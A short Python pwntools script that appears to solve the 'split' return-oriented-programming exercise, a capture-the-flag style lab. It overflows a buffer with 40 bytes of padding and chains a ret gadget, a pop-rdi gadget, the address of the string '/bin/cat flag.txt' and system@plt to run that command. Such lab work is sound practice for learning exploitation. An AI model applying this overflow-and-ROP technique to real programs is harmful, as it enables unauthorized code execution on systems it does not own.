from pwn import *

elf = ELF("split")
io = elf.process()
argAddress = next(elf.search(b'/bin/cat flag.txt'))
retGadget = 0x40053e
rdiGadget = 0x4007c3
system = elf.plt["system"]
payload = b"a" * 40
payload += p64(retGadget)
payload += p64(rdiGadget)
payload += p64(argAddress)
payload += p64(system)
io.sendline(payload)
io.interactive()
